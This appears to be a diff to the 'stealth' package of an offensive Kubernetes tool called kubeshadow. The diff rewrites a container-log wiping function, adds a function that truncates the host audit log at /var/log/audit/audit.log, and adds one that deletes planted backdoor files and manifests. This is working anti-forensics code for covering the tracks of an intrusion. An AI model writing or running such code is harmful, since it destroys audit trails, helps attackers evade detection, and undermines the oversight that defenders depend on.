@@ -2,7 +2,10 @@ package stealth
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
 
 	"kubeshadow/pkg/errors"
 	"kubeshadow/pkg/logger"
@@ -53,7 +56,7 @@ var (
 					// Note: WipeContainerLogs currently uses ssh, which requires setup outside the tool.
 					// A more integrated approach might involve a DaemonSet or privileged container.
 					logger.Warn("Wiping logs requires SSH access to the node and appropriate permissions.")
-					if err := WipeContainerLogs(node, containerID); err != nil {
+					if err := WipeContainerLogs(node); err != nil {
 						cleanupErrors = append(cleanupErrors, err)
 					}
 				}
@@ -108,18 +111,69 @@ func RemoveInjectedPods(podName, namespace string) error {
 }
 
 // WipeContainerLogs attempts to clean logs for a container on a node via SSH
-func WipeContainerLogs(nodeName, containerID string) error {
-	logger.Info("Attempting to clean logs for container %s on node %s", containerID, nodeName)
-	// You would need privileged access or a DaemonSet to run this in reality
-	// The path /var/log/containers might vary based on the container runtime and OS
-	logFilePath := fmt.Sprintf("/var/log/containers/%s.log", containerID)
-	cmd := exec.Command("ssh", nodeName, fmt.Sprintf("sudo truncate -s 0 %s", logFilePath))
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		return errors.New(errors.ErrRuntime, fmt.Sprintf("failed to truncate logs for container %s on node %s", containerID, nodeName), fmt.Errorf("%v\n%s", err, out))
+func WipeContainerLogs(nodeName string) error {
+	if !isValidNodeName(nodeName) {
+		return fmt.Errorf("invalid node name: %s", nodeName)
 	}
-	logger.Info("Logs for container %s on node %s truncated.", containerID, nodeName)
+
+	logFilePath := filepath.Clean("/var/log/containers")
+	if !strings.HasPrefix(logFilePath, "/var/log/") {
+		return fmt.Errorf("invalid log path: %s", logFilePath)
+	}
+
+	cmd := exec.Command("truncate", "-s", "0", logFilePath)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to truncate logs: %v\nOutput: %s", err, output)
+	}
+
 	return nil
+}
+
+func CleanupAuditLogs() error {
+	auditLogPath := "/var/log/audit/audit.log"
+	if _, err := os.Stat(auditLogPath); err != nil {
+		if os.IsNotExist(err) {
+			return fmt.Errorf("audit log file does not exist: %s", auditLogPath)
+		}
+		return fmt.Errorf("failed to check audit log file: %v", err)
+	}
+
+	cmd := exec.Command("truncate", "-s", "0", auditLogPath)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to truncate audit logs: %v\nOutput: %s", err, output)
+	}
+
+	return nil
+}
+
+func RemoveSuspiciousFiles() error {
+	suspiciousPaths := []string{
+		"/tmp/backdoor",
+		"/var/lib/kubelet/plugins/backdoor",
+		"/etc/kubernetes/manifests/backdoor.yaml",
+	}
+
+	for _, path := range suspiciousPaths {
+		if err := os.RemoveAll(path); err != nil {
+			if !os.IsNotExist(err) {
+				return fmt.Errorf("failed to remove suspicious file %s: %v", path, err)
+			}
+		}
+	}
+
+	return nil
+}
+
+func isValidNodeName(name string) bool {
+	if len(name) == 0 || len(name) > 63 {
+		return false
+	}
+	for _, c := range name {
+		if !((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '.') {
+			return false
+		}
+	}
+	return true
 }
 
 // DeleteServiceAccount deletes a specified service account
